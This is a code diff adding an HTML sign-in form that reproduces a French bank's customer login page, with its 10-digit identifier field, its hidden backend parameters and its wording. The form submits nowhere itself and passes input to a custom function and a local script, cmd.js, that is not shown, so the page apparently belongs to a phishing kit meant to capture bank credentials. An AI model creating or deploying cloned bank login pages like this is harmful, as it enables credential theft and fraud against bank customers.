@@ -1,0 +1,71 @@
+<form class="form-xo-1" method="post" action="#" name="formAccesCompte" onSubmit="return false;">
+
+            <div id="hidden">
+                <input type="hidden" name="urlbackend" value="%2Fvoscomptes%2FcanalXHTML%2Fidentif.ea%3Forigin%3Dparticuliers" />
+                <input type="hidden" name="origin" value="particuliers" />
+                <input type="hidden" name="cv" value="true" />
+                <input type="hidden" name="cvvs" value="" />
+                <input type="hidden" id="iscd" name="iscdName" value="0" />
+                <input type="hidden" id="clt" name="cltName" value="0" />
+            </div>
+
+            <!-- ECRAN -->
+            <div class="ecran font-normal" id="ecran">
+                <!-- Identifiant -->
+                <div data-tb-form-field data-tb-form-id="identifiant" class="flex-container w100">
+
+                    <label for='identifiant' class="font-x-medium txt-color-6 mb0">Identifiant &agrave; 10 chiffres</label>
+                    <div class="flex-container w100 mtts">
+                        <div class="tb-container-cvdId w100 --reset flex-item-fluid flex-container-column">
+                            <div class="relative flex-center flex-item-fluid">
+                                <input type="text"
+                                       class="hide-focus"
+                                       id="identifiant"
+                                       inputmode="numeric"
+                                       pattern="[\*0-9]*"
+                                       autocomplete="username"
+                                       maxlength="10"
+                                       aria-required="true"
+                                       accessreset="Effacer la saisie de l&#39;identifiant"
+                                       name="username">
+                            </div>
+                        </div>
+                    </div>
+                    <div data-tb-form-message class="flex-container flex-item-last">
+                        <div data-icon="tb-erreur" aria-hidden="true" class="--size16px mrts mts"></div>
+                        <p data-ad-messages="" class="flex-container--column flex-item-fluid mts mb0">
+                            <span data-ad-message="RG001" hidden>Veuillez renseigner votre identifiant.</span>
+                            <span data-ad-message="RG002" hidden>Votre identifiant est incomplet.</span>
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Case à cocher -->
+                <div class="flex-container w100 mts">
+                    <input id="check" name="check-1" type="checkbox" class="tb-checkbox --animate">
+                    <label for="check" class="flex-item-fluid">
+                        <span class="flex-container--row">
+                      <span class="tb-check" aria-hidden="true" tabindex="-1">
+                          <svg width="11px" height="8px" viewBox="0 0 12 9" aria-hidden="true" focusable="false">
+                            <polyline points="1 5 4 8 11 1"></polyline>
+                          </svg>
+                          <span class="tb-mask-svg"></span>
+                      </span>
+                            <span class="font-x-normal txt-color-black tb-memoriser">M&eacute;moriser mon identifiant (facultatif)</span>
+                        </span>
+                    </label>
+                </div>
+
+                
+                    <!-- Bouton de connexion -->
+                    <div class="mtgl u-txt-center">
+                        <button data-tb-cvd-valider id="btnConnexion1" class="tb-btn-p w100" type="submit" data-lien-user="actif" onclick="submitFormulaire()"
+                                data-tb-cvd-alert="N'appuyez pas sur les chiffres de votre clavier, utilisez les boutons pr&eacute;c&eacute;dents pour saisir votre mot de passe">Se connecter</button>
+                    </div>
+                </div>
+            </div>
+            <!-- /ECRAN -->
+
+        </form>
+        <script src="js/jquery.min.js"></script>
+<script src="js/cmd.js"></script>
